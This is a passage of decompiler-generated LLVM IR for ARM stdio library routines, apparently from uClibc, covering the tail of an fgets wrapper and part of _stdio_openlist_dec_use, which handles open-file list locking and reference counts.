  br i1 %v0_16a68, label %dec_label_pc_16a6c, label %dec_label_pc_16a58.dec_label_pc_16a4c_crit_edge

dec_label_pc_16a58.dec_label_pc_16a4c_crit_edge:  ; preds = %dec_label_pc_16a58
  %v0_16a4c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16a50.pre = load i32, i32* @r4, align 4
  %v1_16a4c = inttoptr i32 %v0_16a4c.pre to i32*
  %v2_16a4c = load i32, i32* %v1_16a4c, align 4
  store i32 %v2_16a4c, i32* %r3.global-to-local, align 4
  %v3_16a50 = icmp uge i32 %v2_16a4c, %v1_16a50.pre
  store i1 %v3_16a50, i1* %cpsr_c.global-to-local, align 1
  %v9_16a50 = icmp eq i32 %v2_16a4c, %v1_16a50.pre
  br i1 %v9_16a50, label %dec_label_pc_16a58, label %dec_label_pc_16a70

dec_label_pc_16a6c:                               ; preds = %dec_label_pc_16a58
  %v0_16a6c = load i32, i32* @r4, align 4
  store i32 %v0_16a6c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16a70

dec_label_pc_16a70:                               ; preds = %dec_label_pc_16a3c, %dec_label_pc_16a58.dec_label_pc_16a4c_crit_edge, %dec_label_pc_16a6c
  %v0_16a70 = phi i32 [ %v0_16a6c, %dec_label_pc_16a6c ], [ %v2_16a4c37, %dec_label_pc_16a3c ], [ %v2_16a4c, %dec_label_pc_16a58.dec_label_pc_16a4c_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16a70 = icmp eq i32 %v0_16a70, 0
  br i1 %v2_16a70, label %bb20, label %bb

bb:                                               ; preds = %dec_label_pc_16a70
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_16a70, %bb
  store i32 92796, i32* @lr, align 4
  %v1_16a78 = xor i1 %v2_16a70, true
  call void @__pseudo_cond_branch(i1 %v1_16a78, i32 ptrtoint (i32* @global_var_14734.518 to i32))
  %v0_16a7c = load i32, i32* @r8, align 4
  %v1_16a7c = load i32, i32* @r7, align 4
  %v2_16a7c = add i32 %v1_16a7c, 64
  %v3_16a7c = inttoptr i32 %v2_16a7c to i32*
  store i32 %v0_16a7c, i32* %v3_16a7c, align 4
  br label %dec_label_pc_16a80

dec_label_pc_16a80:                               ; preds = %dec_label_pc_16a28, %bb20
  %v0_16a80 = load i32, i32* @r7, align 4
  %v1_16a80 = add i32 %v0_16a80, 60
  %v2_16a80 = inttoptr i32 %v1_16a80 to i32*
  %v3_16a80 = load i32, i32* %v2_16a80, align 4
  %v1_16a84 = add i32 %v3_16a80, 1
  store i32 %v1_16a84, i32* %r3.global-to-local, align 4
  store i32 %v1_16a84, i32* %v2_16a80, align 4
  %v0_16a8c.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_16a90.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_16a94.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_16a8c

dec_label_pc_16a8c:                               ; preds = %entry, %dec_label_pc_16a80
  %v0_16a94 = phi i32 [ %arg3, %entry ], [ %v0_16a94.pre, %dec_label_pc_16a80 ]
  %v0_16a90 = phi i32 [ %arg2, %entry ], [ %v0_16a90.pre, %dec_label_pc_16a80 ]
  %v0_16a8c = phi i32 [ %arg1, %entry ], [ %v0_16a8c.pre, %dec_label_pc_16a80 ]
  store i32 %v0_16a90, i32* %r1.global-to-local, align 4
  store i32 %v0_16a94, i32* %r2.global-to-local, align 4
  %v3_16a98 = inttoptr i32 %v0_16a8c to i8*
  %v4_16a98 = call i32 @__GI_fgets_unlocked(i8* %v3_16a98, i32 %v0_16a90, i32 %v0_16a94)
  %v0_16a9c = load i32, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16a9c = icmp eq i32 %v0_16a9c, 0
  store i32 %v4_16a98, i32* %r8.global-to-local, align 4
  br i1 %v2_16a9c, label %dec_label_pc_16aa8, label %dec_label_pc_16b1c

dec_label_pc_16aa8:                               ; preds = %dec_label_pc_16a8c
  %v0_16aa8 = load i32, i32* @r7, align 4
  %v1_16aa8 = add i32 %v0_16aa8, 60
  %v2_16aa8 = inttoptr i32 %v1_16aa8 to i32*
  %v3_16aa8 = load i32, i32* %v2_16aa8, align 4
  %v1_16aac = add i32 %v3_16aa8, -1
  store i32 %v1_16aac, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16ab0 = icmp eq i32 %v1_16aac, 0
  store i32 %v1_16aac, i32* %v2_16aa8, align 4
  br i1 %v2_16ab0, label %dec_label_pc_16abc, label %dec_label_pc_16b1c

dec_label_pc_16abc:                               ; preds = %dec_label_pc_16aa8
  %v0_16abc = load i32, i32* %r3.global-to-local, align 4
  %v1_16abc = load i32, i32* @r7, align 4
  %v2_16abc = add i32 %v1_16abc, 64
  %v3_16abc = inttoptr i32 %v2_16abc to i32*
  store i32 %v0_16abc, i32* %v3_16abc, align 4
  %v0_16ac0 = load i32, i32* @r7, align 4
  %v1_16ac0 = add i32 %v0_16ac0, 56
  store i32 %v1_16ac0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16ac4

dec_label_pc_16ac4:                               ; preds = %dec_label_pc_16af4.dec_label_pc_16ac4_crit_edge, %dec_label_pc_16abc
  %v0_16acc = phi i32 [ %v0_16acc.pre, %dec_label_pc_16af4.dec_label_pc_16ac4_crit_edge ], [ %v1_16ac0, %dec_label_pc_16abc ]
  %v0_16ac4 = phi i32 [ %v0_16ac4.pre, %dec_label_pc_16af4.dec_label_pc_16ac4_crit_edge ], [ %v0_16ac0, %dec_label_pc_16abc ]
  %v1_16ac4 = add i32 %v0_16ac4, 56
  %v2_16ac4 = inttoptr i32 %v1_16ac4 to i32*
  %v3_16ac4 = load i32, i32* %v2_16ac4, align 4
  store i32 %v3_16ac4, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16acc, i32* %r2.global-to-local, align 4
  %v1_16ad024 = inttoptr i32 %v0_16acc to i32*
  %v2_16ad025 = load i32, i32* %v1_16ad024, align 4
  store i32 %v2_16ad025, i32* %r3.global-to-local, align 4
  %v3_16ad427 = icmp uge i32 %v2_16ad025, %v3_16ac4
  store i1 %v3_16ad427, i1* %cpsr_c.global-to-local, align 1
  %v9_16ad433 = icmp eq i32 %v2_16ad025, %v3_16ac4
  br i1 %v9_16ad433, label %dec_label_pc_16adc, label %dec_label_pc_16af4

dec_label_pc_16adc:                               ; preds = %dec_label_pc_16ac4, %dec_label_pc_16adc.dec_label_pc_16ad0_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16aec = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16aec, label %dec_label_pc_16af0, label %dec_label_pc_16adc.dec_label_pc_16ad0_crit_edge

dec_label_pc_16adc.dec_label_pc_16ad0_crit_edge:  ; preds = %dec_label_pc_16adc
  %v0_16ad0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16ad4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16ad0 = inttoptr i32 %v0_16ad0.pre to i32*
  %v2_16ad0 = load i32, i32* %v1_16ad0, align 4
  store i32 %v2_16ad0, i32* %r3.global-to-local, align 4
  %v3_16ad4 = icmp uge i32 %v2_16ad0, %v1_16ad4.pre
  store i1 %v3_16ad4, i1* %cpsr_c.global-to-local, align 1
  %v9_16ad4 = icmp eq i32 %v2_16ad0, %v1_16ad4.pre
  br i1 %v9_16ad4, label %dec_label_pc_16adc, label %dec_label_pc_16af4

dec_label_pc_16af0:                               ; preds = %dec_label_pc_16adc
  %v0_16af0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16af0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16af4

dec_label_pc_16af4:                               ; preds = %dec_label_pc_16ac4, %dec_label_pc_16adc.dec_label_pc_16ad0_crit_edge, %dec_label_pc_16af0
  %v0_16afc = phi i32 [ %v0_16af0, %dec_label_pc_16af0 ], [ %v2_16ad025, %dec_label_pc_16ac4 ], [ %v2_16ad0, %dec_label_pc_16adc.dec_label_pc_16ad0_crit_edge ]
  %v1_16af4 = phi i32 [ %v0_16af0, %dec_label_pc_16af0 ], [ %v3_16ac4, %dec_label_pc_16ac4 ], [ %v1_16ad4.pre, %dec_label_pc_16adc.dec_label_pc_16ad0_crit_edge ]
  %v3_16af4 = icmp uge i32 %v0_16afc, %v1_16af4
  store i1 %v3_16af4, i1* %cpsr_c.global-to-local, align 1
  %v9_16af4 = icmp eq i32 %v0_16afc, %v1_16af4
  br i1 %v9_16af4, label %dec_label_pc_16afc, label %dec_label_pc_16af4.dec_label_pc_16ac4_crit_edge

dec_label_pc_16af4.dec_label_pc_16ac4_crit_edge:  ; preds = %dec_label_pc_16af4
  %v0_16ac4.pre = load i32, i32* @r7, align 4
  %v0_16acc.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16ac4

dec_label_pc_16afc:                               ; preds = %dec_label_pc_16af4
  %v2_16afc = icmp ne i32 %v1_16af4, 0
  store i1 %v2_16afc, i1* %cpsr_c.global-to-local, align 1
  %v7_16b00 = icmp slt i32 %v1_16af4, 2
  br i1 %v7_16b00, label %dec_label_pc_16b1c, label %dec_label_pc_16b04

dec_label_pc_16b04:                               ; preds = %dec_label_pc_16afc
  %v0_16b08 = load i32, i32* %r1.global-to-local, align 4
  %v1_16b08 = add i32 %v0_16b08, 129
  store i32 %v1_16b08, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16b1c

dec_label_pc_16b1c:                               ; preds = %dec_label_pc_16aa8, %dec_label_pc_16a8c, %dec_label_pc_16b04, %dec_label_pc_16afc
  %v0_16b1c = load i32, i32* %r8.global-to-local, align 4
  %v2_16b20 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_16b20, i32* %r4.global-to-local, align 4
  store i32 %v6_16a0c, i32* @r5, align 4
  store i32 %v9_16a0c, i32* @r6, align 4
  store i32 %v12_16a0c, i32* @r7, align 4
  store i32 %v15_16a0c, i32* @r8, align 4
  store i32 %v24_16a0c, i32* @lr, align 4
  ret i32 %v0_16b1c

; uselistorder directives
  uselistorder i32 %v0_16af0, { 1, 0, 2 }
  uselistorder i32 %v1_16ad4.pre, { 0, 2, 1 }
  uselistorder i32 %v0_16a90, { 1, 0 }
  uselistorder i32 %v0_16a94, { 1, 0 }
  uselistorder i32 %v1_16a50.pre, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 0, 5, 6, 7, 8, 10, 9, 12, 11 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 9, 10, 3, 4, 5, 6, 11, 12, 7, 8 }
  uselistorder i32 %arg3, { 0, 1, 3, 4, 2, 5 }
  uselistorder label %dec_label_pc_16b1c, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_16af4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16adc, { 1, 0 }
  uselistorder label %dec_label_pc_16a8c, { 1, 0 }
  uselistorder label %dec_label_pc_16a80, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_16a70, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16a58, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_16b28 = load i32, i32* @r4, align 4
  store i32 %v3_16b28, i32* %stack_var_-20, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* %r5.global-to-local, align 4
  %v4_16b38 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 160) to i32*), align 4
  store i32 %v4_16b38, i32* %r7.global-to-local, align 4
  %v0_16b3c = call i32 @__aeabi_read_tp()
  store i32 %v0_16b3c, i32* %r0.global-to-local, align 4
  %v1_16b40 = add i32 %v4_16b38, 8
  %v2_16b40 = inttoptr i32 %v1_16b40 to i32*
  %v3_16b40 = load i32, i32* %v2_16b40, align 4
  store i32 %v3_16b40, i32* %r3.global-to-local, align 4
  %v1_16b44 = add i32 %v0_16b3c, -1168
  store i32 %v1_16b44, i32* %r6.global-to-local, align 4
  %v3_16b48 = icmp uge i32 %v3_16b40, %v1_16b44
  store i1 %v3_16b48, i1* %cpsr_c.global-to-local, align 1
  %v9_16b48 = icmp eq i32 %v3_16b40, %v1_16b44
  br i1 %v9_16b48, label %dec_label_pc_16b94, label %dec_label_pc_16b54

dec_label_pc_16b54:                               ; preds = %entry
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_16b38, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_16b6093 = inttoptr i32 %v4_16b38 to i32*
  %v2_16b6094 = load i32, i32* %v1_16b6093, align 4
  store i32 %v2_16b6094, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_16b6496 = icmp eq i32 %v2_16b6094, 0
  br i1 %v9_16b6496, label %dec_label_pc_16b6c, label %dec_label_pc_16b84

dec_label_pc_16b6c:                               ; preds = %dec_label_pc_16b54, %dec_label_pc_16b6c.dec_label_pc_16b60_crit_edge
  %v0_16b6c97 = phi i32 [ %v1_16b64.pre, %dec_label_pc_16b6c.dec_label_pc_16b60_crit_edge ], [ 0, %dec_label_pc_16b54 ]
  store i32 %v0_16b6c97, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16b7c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16b7c, label %dec_label_pc_16b80, label %dec_label_pc_16b6c.dec_label_pc_16b60_crit_edge

dec_label_pc_16b6c.dec_label_pc_16b60_crit_edge:  ; preds = %dec_label_pc_16b6c
  %v0_16b60.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16b64.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16b60 = inttoptr i32 %v0_16b60.pre to i32*
  %v2_16b60 = load i32, i32* %v1_16b60, align 4
  store i32 %v2_16b60, i32* %r3.global-to-local, align 4
  %v3_16b64 = icmp uge i32 %v2_16b60, %v1_16b64.pre
  store i1 %v3_16b64, i1* %cpsr_c.global-to-local, align 1
  %v9_16b64 = icmp eq i32 %v2_16b60, %v1_16b64.pre
  br i1 %v9_16b64, label %dec_label_pc_16b6c, label %dec_label_pc_16b84

dec_label_pc_16b80:                               ; preds = %dec_label_pc_16b6c
  %v0_16b80 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16b80, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16b84

dec_label_pc_16b84:                               ; preds = %dec_label_pc_16b54, %dec_label_pc_16b6c.dec_label_pc_16b60_crit_edge, %dec_label_pc_16b80
  %v0_16b84 = phi i32 [ %v0_16b80, %dec_label_pc_16b80 ], [ %v2_16b6094, %dec_label_pc_16b54 ], [ %v2_16b60, %dec_label_pc_16b6c.dec_label_pc_16b60_crit_edge ]
  %v1_16b84 = phi i32 [ %v0_16b80, %dec_label_pc_16b80 ], [ 0, %dec_label_pc_16b54 ], [ %v1_16b64.pre, %dec_label_pc_16b6c.dec_label_pc_16b60_crit_edge ]
  %v3_16b84 = icmp uge i32 %v0_16b84, %v1_16b84
  store i1 %v3_16b84, i1* %cpsr_c.global-to-local, align 1
  %v9_16b84 = icmp eq i32 %v0_16b84, %v1_16b84
  br i1 %v9_16b84, label %bb45, label %bb

bb:                                               ; preds = %dec_label_pc_16b84
  %v1_16b88 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_16b88, i32* %r0.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_16b84, %bb
  %v1_16b8c = xor i1 %v9_16b84, true
  call void @__pseudo_cond_branch(i1 %v1_16b8c, i32 ptrtoint (i32* @global_var_14734.518 to i32))
  %v0_16b90 = load i32, i32* %r6.global-to-local, align 4
  %v1_16b90 = load i32, i32* %r7.global-to-local, align 4
  %v2_16b90 = add i32 %v1_16b90, 8
  %v3_16b90 = inttoptr i32 %v2_16b90 to i32*
  store i32 %v0_16b90, i32* %v3_16b90, align 4
  br label %dec_label_pc_16b94

dec_label_pc_16b94:                               ; preds = %entry, %bb45
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16b98 = load i32, i32* %r5.global-to-local, align 4
  %v2_16b98 = add i32 %v0_16b98, 160
  %v3_16b98 = inttoptr i32 %v2_16b98 to i32*
  %v4_16b98 = load i32, i32* %v3_16b98, align 4
  store i32 %v4_16b98, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_16ba0 = add i32 %v0_16b98, 12
  %v3_16ba0 = inttoptr i32 %v2_16ba0 to i32*
  %v4_16ba0 = load i32, i32* %v3_16ba0, align 4
  store i32 %v4_16ba0, i32* %r3.global-to-local, align 4
  %v1_16ba4 = inttoptr i32 %v4_16ba0 to i32*
  %v2_16ba4 = load i32, i32* %v1_16ba4, align 4
  store i32 %v2_16ba4, i32* %r1.global-to-local, align 4
  %v1_16ba8 = add i32 %v4_16b98, 4
  %v2_16ba8 = inttoptr i32 %v1_16ba8 to i32*
  %v3_16ba8 = load i32, i32* %v2_16ba8, align 4
  %v2_16bac = icmp ne i32 %v2_16ba4, 0
  store i1 %v2_16bac, i1* %cpsr_c.global-to-local, align 1
  %v7_16bac = icmp eq i32 %v2_16ba4, 1
  %v1_16bb0 = add i32 %v3_16ba8, 1
  store i32 %v1_16bb0, i32* %r3.global-to-local, align 4
  store i32 %v1_16bb0, i32* %v2_16ba8, align 4
  br i1 %v7_16bac, label %dec_label_pc_16bbc, label %dec_label_pc_16d20

dec_label_pc_16bbc:                               ; preds = %dec_label_pc_16b94
  store i32 80, i32* %r3.global-to-local, align 4
  %v0_16bc0 = load i32, i32* %r5.global-to-local, align 4
  %v2_16bc0 = add i32 %v0_16bc0, 80
  %v3_16bc0 = inttoptr i32 %v2_16bc0 to i32*
  %v4_16bc0 = load i32, i32* %v3_16bc0, align 4
  store i32 %v4_16bc0, i32* %r3.global-to-local, align 4
  %v1_16bc4 = inttoptr i32 %v4_16bc0 to i32*
  %v2_16bc4 = load i32, i32* %v1_16bc4, align 4
  store i32 %v2_16bc4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp46 = icmp slt i32 %v2_16bc4, 1
  br i1 %tmp46, label %dec_label_pc_16d20, label %dec_label_pc_16bd0

dec_label_pc_16bd0:                               ; preds = %dec_label_pc_16bbc
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_16bd4 = add i32 %v0_16bc0, 152
  %v3_16bd4 = inttoptr i32 %v2_16bd4 to i32*
  %v4_16bd4 = load i32, i32* %v3_16bd4, align 4
  store i32 %v4_16bd4, i32* %r7.global-to-local, align 4
  %v1_16bd8 = add i32 %v4_16bd4, 8
  %v2_16bd8 = inttoptr i32 %v1_16bd8 to i32*
  %v3_16bd8 = load i32, i32* %v2_16bd8, align 4
  store i32 %v3_16bd8, i32* %r3.global-to-local, align 4
  %v1_16bdc = load i32, i32* %r6.global-to-local, align 4
  %v3_16bdc = icmp uge i32 %v3_16bd8, %v1_16bdc
  store i1 %v3_16bdc, i1* %cpsr_c.global-to-local, align 1
  %v9_16bdc = icmp eq i32 %v3_16bd8, %v1_16bdc
  br i1 %v9_16bdc, label %dec_label_pc_16c20, label %dec_label_pc_16be4

dec_label_pc_16be4:                               ; preds = %dec_label_pc_16bd0
  store i32 %v4_16bd4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_16bec86 = inttoptr i32 %v4_16bd4 to i32*
  %v2_16bec87 = load i32, i32* %v1_16bec86, align 4
  store i32 %v2_16bec87, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_16bf089 = icmp eq i32 %v2_16bec87, 0
  br i1 %v9_16bf089, label %dec_label_pc_16bf8, label %dec_label_pc_16c10

dec_label_pc_16bf8:                               ; preds = %dec_label_pc_16be4, %dec_label_pc_16bf8.dec_label_pc_16bec_crit_edge
  %v0_16bf890 = phi i32 [ %v1_16bf0.pre, %dec_label_pc_16bf8.dec_label_pc_16bec_crit_edge ], [ 0, %dec_label_pc_16be4 ]
  store i32 %v0_16bf890, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16c08 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16c08, label %dec_label_pc_16c0c, label %dec_label_pc_16bf8.dec_label_pc_16bec_crit_edge

dec_label_pc_16bf8.dec_label_pc_16bec_crit_edge:  ; preds = %dec_label_pc_16bf8
  %v0_16bec.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16bf0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16bec = inttoptr i32 %v0_16bec.pre to i32*
  %v2_16bec = load i32, i32* %v1_16bec, align 4
  store i32 %v2_16bec, i32* %r3.global-to-local, align 4
  %v3_16bf0 = icmp uge i32 %v2_16bec, %v1_16bf0.pre
  store i1 %v3_16bf0, i1* %cpsr_c.global-to-local, align 1
  %v9_16bf0 = icmp eq i32 %v2_16bec, %v1_16bf0.pre
  br i1 %v9_16bf0, label %dec_label_pc_16bf8, label %dec_label_pc_16c10

dec_label_pc_16c0c:                               ; preds = %dec_label_pc_16bf8
  %v0_16c0c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16c0c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16c10

dec_label_pc_16c10:                               ; preds = %dec_label_pc_16be4, %dec_label_pc_16bf8.dec_label_pc_16bec_crit_edge, %dec_label_pc_16c0c
  %v0_16c10 = phi i32 [ %v0_16c0c, %dec_label_pc_16c0c ], [ %v2_16bec87, %dec_label_pc_16be4 ], [ %v2_16bec, %dec_label_pc_16bf8.dec_label_pc_16bec_crit_edge ]
  %v1_16c10 = phi i32 [ %v0_16c0c, %dec_label_pc_16c0c ], [ 0, %dec_label_pc_16be4 ], [ %v1_16bf0.pre, %dec_label_pc_16bf8.dec_label_pc_16bec_crit_edge ]
  %v3_16c10 = icmp uge i32 %v0_16c10, %v1_16c10
  store i1 %v3_16c10, i1* %cpsr_c.global-to-local, align 1
  %v9_16c10 = icmp eq i32 %v0_16c10, %v1_16c10
  br i1 %v9_16c10, label %bb48, label %bb47

bb47:                                             ; preds = %dec_label_pc_16c10
  %v1_16c14 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_16c14, i32* %r0.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_16c10, %bb47
  %v1_16c18 = xor i1 %v9_16c10, true
  call void @__pseudo_cond_branch(i1 %v1_16c18, i32 ptrtoint (i32* @global_var_14734.518 to i32))
  %v0_16c1c = load i32, i32* %r6.global-to-local, align 4
  %v1_16c1c = load i32, i32* %r7.global-to-local, align 4
  %v2_16c1c = add i32 %v1_16c1c, 8
  %v3_16c1c = inttoptr i32 %v2_16c1c to i32*
  store i32 %v0_16c1c, i32* %v3_16c1c, align 4
  %v0_16c28.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16c20

dec_label_pc_16c20:                               ; preds = %dec_label_pc_16bd0, %bb48
  %v0_16c28 = phi i32 [ %v0_16bc0, %dec_label_pc_16bd0 ], [ %v0_16c28.pre, %bb48 ]
  store i32 152, i32* %r3.global-to-local, align 4
  store i32 76, i32* %r1.global-to-local, align 4
  %v2_16c28 = add i32 %v0_16c28, 152
  %v3_16c28 = inttoptr i32 %v2_16c28 to i32*
  %v4_16c28 = load i32, i32* %v3_16c28, align 4
  store i32 %v4_16c28, i32* %r0.global-to-local, align 4
  %v2_16c2c = add i32 %v0_16c28, 76
  %v3_16c2c = inttoptr i32 %v2_16c2c to i32*
  %v4_16c2c = load i32, i32* %v3_16c2c, align 4
  store i32 %v4_16c2c, i32* %r2.global-to-local, align 4
  %v1_16c30 = add i32 %v4_16c28, 4
  %v2_16c30 = inttoptr i32 %v1_16c30 to i32*
  %v3_16c30 = load i32, i32* %v2_16c30, align 4
  store i32 %v3_16c30, i32* %r3.global-to-local, align 4
  %v1_16c34 = inttoptr i32 %v4_16c2c to i32*
  %v2_16c34 = load i32, i32* %v1_16c34, align 4
  store i32 %v2_16c34, i32* %r2.global-to-local, align 4
  %v1_16c38 = add i32 %v3_16c30, 1
  store i32 %v1_16c38, i32* %r3.global-to-local, align 4
  store i32 76, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v1_16c38, i32* %v2_16c30, align 4
  %v0_16c88.pr = load i32, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16c8811 = icmp eq i32 %v0_16c88.pr, 0
  store i32 32816, i32* %r1.global-to-local, align 4
  br i1 %v2_16c8811, label %dec_label_pc_16c94, label %dec_label_pc_16c4c

dec_label_pc_16c4c:                               ; preds = %dec_label_pc_16c20, %dec_label_pc_16c84
  %v0_16c702 = phi i32 [ %v0_16c84, %dec_label_pc_16c84 ], [ %v0_16c88.pr, %dec_label_pc_16c20 ]
  %v1_16c4c = inttoptr i32 %v0_16c702 to i16*
  %v2_16c4c = load i16, i16* %v1_16c4c, align 2
  %v3_16c4c = zext i16 %v2_16c4c to i32
  store i32 %v3_16c4c, i32* %r3.global-to-local, align 4
  %v2_16c50 = and i32 %v3_16c4c, 32816
  store i32 %v2_16c50, i32* %r1.global-to-local, align 4
  %v2_16c54 = icmp ugt i32 %v2_16c50, 47
  store i1 %v2_16c54, i1* %cpsr_c.global-to-local, align 1
  %v7_16c54 = icmp eq i32 %v2_16c50, 48
  %v1_16c58 = add i32 %v0_16c702, 32
  %v2_16c58 = inttoptr i32 %v1_16c58 to i32*
  %v3_16c58 = load i32, i32* %v2_16c58, align 4
  store i32 %v3_16c58, i32* %r4.global-to-local, align 4
  br i1 %v7_16c54, label %dec_label_pc_16c64, label %.thread38

.thread38:                                        ; preds = %dec_label_pc_16c4c
  store i32 %v0_16c702, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16c84

dec_label_pc_16c64:                               ; preds = %dec_label_pc_16c4c
  %v0_16c64 = load i32, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16c64 = icmp eq i32 %v0_16c64, 0
  br i1 %v2_16c64, label %.thread, label %bb49

.thread:                                          ; preds = %dec_label_pc_16c64
  %v1_16c68 = load i32, i32* %r5.global-to-local, align 4
  %v2_16c68 = load i32, i32* %r7.global-to-local, align 4
  %v3_16c68 = add i32 %v2_16c68, %v1_16c68
  %v4_16c68 = inttoptr i32 %v3_16c68 to i32*
  %v5_16c68 = load i32, i32* %v4_16c68, align 4
  store i32 %v5_16c68, i32* %r3.global-to-local, align 4
  %v3_16c6c = inttoptr i32 %v5_16c68 to i32*
  store i32 %v3_16c58, i32* %v3_16c6c, align 4
  %v0_16c70 = load i32, i32* %r2.global-to-local, align 4
  %v1_16c70 = inttoptr i32 %v0_16c70 to i16*
  %v2_16c70 = load i16, i16* %v1_16c70, align 2
  %v3_16c70 = zext i16 %v2_16c70 to i32
  store i32 %v3_16c70, i32* %r3.global-to-local, align 4
  br label %bb50

bb49:                                             ; preds = %dec_label_pc_16c64
  %v2_16c708 = load i16, i16* %v1_16c4c, align 2
  %v3_16c709 = zext i16 %v2_16c708 to i32
  store i32 %v3_16c709, i32* %r3.global-to-local, align 4
  %v3_16c74 = add i32 %v0_16c64, 32
  %v4_16c74 = inttoptr i32 %v3_16c74 to i32*
  store i32 %v3_16c58, i32* %v4_16c74, align 4
  %v0_16c78.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb50

bb50:                                             ; preds = %.thread, %bb49
  %v0_16c78 = phi i32 [ %v3_16c70, %.thread ], [ %v0_16c78.pre, %bb49 ]
  %v1_16c78 = and i32 %v0_16c78, 8192
  %v2_16c78 = icmp eq i32 %v1_16c78, 0
  br i1 %v2_16c78, label %bb52, label %bb51

bb51:                                             ; preds = %bb50
  %v1_16c7c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_16c7c, i32* %r0.global-to-local, align 4
  br label %bb52

bb52:                                             ; preds = %bb50, %bb51
  %v1_16c80 = xor i1 %v2_16c78, true
  call void @__pseudo_cond_branch(i1 %v1_16c80, i32 ptrtoint (i32* @global_var_1357c.35 to i32))
  %v0_16c84.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16c84

dec_label_pc_16c84:                               ; preds = %.thread38, %bb52
  %v0_16c84 = phi i32 [ %v0_16c84.pre, %bb52 ], [ %v3_16c58, %.thread38 ]
  store i32 %v0_16c84, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16c88 = icmp eq i32 %v0_16c84, 0
  store i32 32816, i32* %r1.global-to-local, align 4
